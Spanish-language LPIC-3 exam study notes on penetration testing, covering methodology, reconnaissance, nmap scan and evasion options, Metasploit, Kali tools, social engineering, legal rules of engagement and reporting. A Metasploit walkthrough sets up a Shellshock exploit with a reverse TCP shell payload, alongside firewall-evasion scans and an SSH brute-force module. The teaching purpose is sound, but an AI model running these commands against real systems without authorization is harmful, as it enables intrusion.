---
tipo: teoria
certificacion: lpic-3
especialidad: 303 - Seguridad
bloque: "335 - Amenazas y Evaluacion de Vulnerabilidades"
tema: "335.2 - Pruebas de penetracion"
subtema: "335.2"
peso: 3
tags:
  - lpic-3
  - tema-335
  - pentesting
  - nmap
  - metasploit
  - reconocimiento
---

# 335.2 Pruebas de Penetracion

## Introduccion

Las pruebas de penetracion (pentesting) son evaluaciones de seguridad autorizadas que simulan ataques reales para identificar vulnerabilidades explotables. Este subtema cubre la metodologia, herramientas clave como nmap y Metasploit, y el marco legal y etico.

> **Para el examen:** Centra tu estudio en la metodologia de pentesting, los tipos de escaneo avanzado con nmap, los conceptos basicos de Metasploit y el marco legal. El examen no espera que seas un pentester, sino que comprendas el proceso.

---

## Metodologia de Pruebas de Penetracion

### Fases del Pentesting

| Fase | Descripcion | Herramientas |
|------|-------------|--------------|
| 1. Reconocimiento | Recopilar informacion sobre el objetivo | whois, dig, nslookup, theHarvester |
| 2. Escaneo | Descubrir hosts, puertos y servicios | nmap, masscan |
| 3. Enumeracion | Obtener informacion detallada de servicios | nmap scripts, enum4linux |
| 4. Explotacion | Explotar vulnerabilidades encontradas | Metasploit, exploits manuales |
| 5. Post-explotacion | Mantener acceso, pivotar, exfiltrar | Meterpreter, shells |
| 6. Reporte | Documentar hallazgos y recomendaciones | Documento formal |

### Tipos de Pruebas

| Tipo | Conocimiento previo | Descripcion |
|------|---------------------|-------------|
| Black box | Ninguno | Simula atacante externo sin informacion |
| White box | Completo | Acceso total a documentacion, codigo, credenciales |
| Grey box | Parcial | Informacion limitada (simula insider o usuario) |

---

## Reconocimiento (Reconnaissance)

### Reconocimiento Pasivo

No interactua directamente con el objetivo. Usa fuentes publicas.

```bash
# Consulta WHOIS
whois ejemplo.com

# Consultas DNS
dig ejemplo.com ANY
dig ejemplo.com MX
dig ejemplo.com NS
dig -x 203.0.113.10    # DNS inverso

# Transferencia de zona (si esta mal configurada)
dig @ns1.ejemplo.com ejemplo.com AXFR

# Busqueda de subdominios
host -t ns ejemplo.com
host -l ejemplo.com ns1.ejemplo.com

# Consulta de registros de correo
dig ejemplo.com TXT    # SPF, DKIM, DMARC

# theHarvester - recopilacion de emails y subdominios
theHarvester -d ejemplo.com -b google

# Shodan (buscador de dispositivos)
# Buscar servicios expuestos del objetivo
```

### Reconocimiento Activo

Interactua con el objetivo. Puede ser detectado.

```bash
# Descubrimiento de hosts
nmap -sn 192.168.1.0/24         # Ping sweep
nmap -sn -PE 192.168.1.0/24     # ICMP echo
nmap -sn -PS80,443 192.168.1.0/24  # TCP SYN ping

# Traceroute
traceroute ejemplo.com
traceroute -T ejemplo.com    # TCP traceroute
```

---

## nmap - Escaneo Avanzado

### Tipos de Escaneo

```bash
# Escaneo TCP SYN (sigiloso, por defecto con root)
nmap -sS 192.168.1.100

# Escaneo TCP Connect (completa el handshake)
nmap -sT 192.168.1.100

# Escaneo UDP
nmap -sU 192.168.1.100

# Escaneo TCP SYN + UDP
nmap -sS -sU 192.168.1.100

# Escaneo FIN (evade algunos firewalls)
nmap -sF 192.168.1.100

# Escaneo Xmas (FIN + PSH + URG)
nmap -sX 192.168.1.100

# Escaneo NULL (sin flags)
nmap -sN 192.168.1.100

# Escaneo ACK (detecta firewalls stateful)
nmap -sA 192.168.1.100

# Escaneo idle/zombie
nmap -sI zombie_host 192.168.1.100
```

| Tipo de Escaneo | Flag | Descripcion |
|----------------|------|-------------|
| SYN scan | `-sS` | Envia SYN, no completa handshake |
| Connect scan | `-sT` | Completa handshake TCP |
| UDP scan | `-sU` | Escaneo de puertos UDP |
| FIN scan | `-sF` | Solo flag FIN |
| Xmas scan | `-sX` | Flags FIN+PSH+URG |
| NULL scan | `-sN` | Sin flags TCP |
| ACK scan | `-sA` | Solo flag ACK (detecta firewall) |
| Window scan | `-sW` | Analiza ventana TCP |
| Idle scan | `-sI` | Usa host zombie |

### Opciones Avanzadas de nmap

```bash
# Deteccion de version de servicios
nmap -sV 192.168.1.100

# Deteccion de sistema operativo
nmap -O 192.168.1.100

# Scripts NSE (Nmap Scripting Engine)
nmap --script=default 192.168.1.100
nmap --script=vuln 192.168.1.100
nmap --script=http-enum 192.168.1.100
nmap --script=smb-vuln* 192.168.1.100

# Escaneo agresivo (version + OS + scripts + traceroute)
nmap -A 192.168.1.100

# Especificar puertos
nmap -p 80,443,8080 192.168.1.100
nmap -p 1-1000 192.168.1.100
nmap -p- 192.168.1.100            # Todos los 65535 puertos
nmap --top-ports 100 192.168.1.100

# Control de velocidad
nmap -T0 192.168.1.100    # Paranoico (muy lento)
nmap -T1 192.168.1.100    # Sigiloso
nmap -T2 192.168.1.100    # Educado
nmap -T3 192.168.1.100    # Normal (por defecto)
nmap -T4 192.168.1.100    # Agresivo
nmap -T5 192.168.1.100    # Insano (rapido)

# Salida
nmap -oN resultado.txt 192.168.1.100     # Normal
nmap -oX resultado.xml 192.168.1.100     # XML
nmap -oG resultado.gnmap 192.168.1.100   # Grepable
nmap -oA resultado 192.168.1.100         # Todos los formatos

# Evasion de firewall
nmap -f 192.168.1.100              # Fragmentar paquetes
nmap -D RND:5 192.168.1.100       # Señuelos aleatorios
nmap --source-port 53 192.168.1.100 # Puerto de origen especifico
nmap --data-length 25 192.168.1.100 # Añadir datos al paquete
```

> **Para el examen:** Conoce las diferencias entre `-sS` (SYN), `-sT` (Connect), `-sU` (UDP) y los escaneos de evasion (`-sF`, `-sX`, `-sN`). Comprende los niveles de timing (`-T0` a `-T5`) y los scripts NSE.

---

## Metasploit Framework

Metasploit es el framework de pentesting mas utilizado, con una extensa base de datos de exploits.

### Estructura

| Componente | Descripcion |
|-----------|-------------|
| Exploit | Codigo que aprovecha una vulnerabilidad |
| Payload | Codigo que se ejecuta tras la explotacion |
| Auxiliary | Modulos de apoyo (escaneo, fuzzing) |
| Post | Modulos de post-explotacion |
| Encoder | Codificadores para evadir deteccion |

### Uso Basico

```bash
# Iniciar Metasploit
msfconsole

# Buscar exploits
msf> search type:exploit platform:linux apache
msf> search cve:2021-44228

# Seleccionar exploit
msf> use exploit/linux/http/apache_mod_cgi_bash_env_exec

# Ver opciones
msf> show options
msf> show payloads

# Configurar
msf> set RHOSTS 192.168.1.100
msf> set RPORT 80
msf> set PAYLOAD linux/x64/shell_reverse_tcp
msf> set LHOST 192.168.1.50
msf> set LPORT 4444

# Ejecutar
msf> exploit
# o
msf> run

# Ver sesiones activas
msf> sessions -l
msf> sessions -i 1    # Interactuar con sesion 1
```

### Modulos Auxiliares

```bash
# Escaneo de puertos
msf> use auxiliary/scanner/portscan/tcp
msf> set RHOSTS 192.168.1.0/24

# Enumeracion de servicios
msf> use auxiliary/scanner/smb/smb_version
msf> use auxiliary/scanner/ssh/ssh_version

# Fuerza bruta
msf> use auxiliary/scanner/ssh/ssh_login
```

---

## Kali Linux

Kali Linux es la distribucion de referencia para pentesting, con cientos de herramientas preinstaladas organizadas por categorias:

| Categoria | Herramientas ejemplo |
|-----------|---------------------|
| Information Gathering | nmap, maltego, recon-ng |
| Vulnerability Analysis | OpenVAS, nikto, wpscan |
| Web Applications | Burp Suite, SQLMap, dirb |
| Password Attacks | John the Ripper, Hashcat, Hydra |
| Wireless | aircrack-ng, wifite |
| Exploitation | Metasploit, BeEF |
| Sniffing/Spoofing | Wireshark, ettercap, mitmproxy |
| Post-Exploitation | Empire, mimikatz |
| Forensics | Autopsy, volatility |

---

## Ingenieria Social

La ingenieria social explota la confianza humana para obtener informacion o acceso.

| Tecnica | Descripcion |
|---------|-------------|
| Phishing | Correos fraudulentos que imitan entidades legitimas |
| Spear Phishing | Phishing dirigido a personas especificas |
| Pretexting | Creacion de un escenario falso para obtener informacion |
| Baiting | Dejar dispositivos infectados (USB) para que sean encontrados |
| Tailgating | Seguir a alguien autorizado para acceder fisicamente |
| Vishing | Phishing por telefono |

---

## Marco Legal y Etico

### Reglas de Compromiso (Rules of Engagement)

Todo pentesting debe tener un documento formal que defina:

- **Alcance**: Sistemas, redes e IPs incluidos y excluidos
- **Ventana de tiempo**: Cuando se realizaran las pruebas
- **Tecnicas permitidas**: Que tipos de ataques se pueden realizar
- **Limites**: Ingenieria social, DoS, acceso fisico
- **Contactos de emergencia**: A quien avisar si algo sale mal
- **Manejo de datos**: Como se tratan los datos sensibles encontrados

### Aspectos Legales

- **Autorizacion escrita** SIEMPRE es necesaria antes de cualquier prueba
- Las pruebas sin autorizacion son **ilegales** en la mayoria de jurisdicciones
- Cumplimiento con leyes locales de proteccion de datos
- Confidencialidad de los hallazgos

> **Para el examen:** La autorizacion escrita es el requisito mas importante. Sin ella, cualquier actividad de pentesting es ilegal. Conoce los componentes de las reglas de compromiso.

---

## Estandares de Reporte

### Estructura de un Informe de Pentesting

1. **Resumen Ejecutivo**: Vision general para la direccion
2. **Alcance y Metodologia**: Que se probo y como
3. **Hallazgos**: Lista de vulnerabilidades con severidad
4. **Evidencia**: Capturas, logs, pruebas de concepto
5. **Impacto**: Consecuencias potenciales de cada vulnerabilidad
6. **Recomendaciones**: Acciones correctivas priorizadas
7. **Apendices**: Detalles tecnicos, salidas de herramientas

### Estandares Reconocidos

| Estandar | Descripcion |
|----------|-------------|
| PTES | Penetration Testing Execution Standard |
| OSSTMM | Open Source Security Testing Methodology Manual |
| NIST SP 800-115 | Technical Guide to Information Security Testing |
| OWASP Testing Guide | Guia de pruebas para aplicaciones web |
